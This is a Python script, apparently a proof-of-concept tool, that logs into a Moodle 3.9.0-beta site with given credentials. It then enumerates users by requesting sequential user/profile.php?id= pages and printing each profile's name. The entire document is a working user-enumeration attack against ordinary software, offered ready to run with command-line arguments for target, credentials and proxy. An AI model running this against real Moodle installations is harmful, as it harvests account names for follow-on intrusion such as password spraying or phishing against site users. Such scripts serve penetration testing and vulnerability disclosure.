## Tested on: moodle v3.9.0-beta

import argparse
import requests
from bs4 import BeautifulSoup

class MoodleEnum:
    def __init__(self,base_url:str,username:str,password:str,proxies:str):
        self.base_url = base_url
        self.login_url = base_url + "/moodle/login/index.php"

        self.username = username
        self.password = password

        self.moodle_session = requests.Session()
        self.proxies = proxies


    def moodle_login_token(self) -> str:
        header = {"Referer":f"{self.base_url}/moodle/"}

        r = self.moodle_session.get(self.login_url,headers=header,proxies=self.proxies)
        if(r.status_code == 200):
            html_text = r.text
            soup = BeautifulSoup(html_text, 'html.parser')
            page_input = soup.find_all('input')
            for track in page_input:
                if(track.get('name') == "logintoken"):
                    login_token = track.get('value')
                    print(f"[+] Login token: {login_token}")
                    return login_token
        else:
            print(f"[x] Url: {self.login_url} return: {r.status_code}")
        return ""
            
    def moodle_login(self,login_token:str) -> dict:
        header = {
            "Referer":f"{self.base_url}/moodle/login/index.php",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0"
        }
        login_body = {
            "anchor":       "",
            "logintoken":   login_token,
            "username":     self.username,
            "password":     self.password
        }

        r = self.moodle_session.post(self.login_url,data = login_body,headers=header, proxies=self.proxies, allow_redirects=False)
        if(r.status_code == 303):
            html_text = r.text
            soup = BeautifulSoup(html_text, 'html.parser')
            page_input = soup.find_all('a')
            for track in page_input:
                if("index.php?testsession" in track.get('href')):
                    print(f"[+] Successfully login: {self.login_url}")
                    return True
        else:
            print(f"[x] Url: {self.login_url} return: {r.status_code}")
        return False

    def moodle_user_enum(self):
        header = {"Referer":f"{self.base_url}/moodle/login/index.php"}
        MAX_NB_REQUEST = 10
        nb_user = 0
        print("[+] Username list:")

        for i in range(1,MAX_NB_REQUEST): # 1 to test !!!
            profile_url = f"{self.base_url}/moodle/user/profile.php?id={i}"
            r = self.moodle_session.get(profile_url,headers=header,proxies=self.proxies)
            if(r.status_code == 200):
                html_text = r.text
                soup = BeautifulSoup(html_text, 'html.parser')
                page_input = soup.find('h1').text
                if(page_input != "" and page_input != "User"):
                    print(f"\t{page_input}")
                    nb_user += 1
            else:
                print(f"[x] Url: {profile_url} return: {r.status_code}")
        if(i > 1):
            print(f"[+] Number of users: {nb_user}")
        return ""


def ManageArg() -> dict:
    parser = argparse.ArgumentParser(description='Moodle User Enumeration (Authenticate)', usage='%(prog)s -h [http://IP_ADDRESS:PORT] -u [username] -p [password] --proxy [http://IP_ADDRESS:8080]')
    parser.version = 'MoodleUserEnum version: 0.1.1-Dev'

    parser.add_argument('-u', "--username", metavar=' [username]', type=str,help='The user name', default=None, required=True)
    parser.add_argument('-p', "--password", metavar=' [password]', type=str,help='The user password', default=None, required=True)
    parser.add_argument('-t', "--host", metavar='[http://IP_ADDRESS:PORT]', type=str, help='The IP address of the web server', default=None, required=True)
    parser.add_argument('--proxy',          metavar=' [http://IP_ADDRESS:PORT]', type=str,  help='Proxy formate: http://127.0.0.1:8080', default="")
    try:
        args = parser.parse_args()
    except:
        exit(0)
        
    userConfig = {
            'username' : args.username,
            'password' : args.password,
            'host' : args.host,
            'proxy' : args.proxy
    }
    return userConfig

userConfig = ManageArg()
moodleEnum = MoodleEnum(userConfig["host"], userConfig["username"], userConfig["password"], userConfig["proxy"])
login_token = moodleEnum.moodle_login_token()
if(login_token != ""):
    result = moodleEnum.moodle_login(login_token)
    if(result):
        moodleEnum.moodle_user_enum()

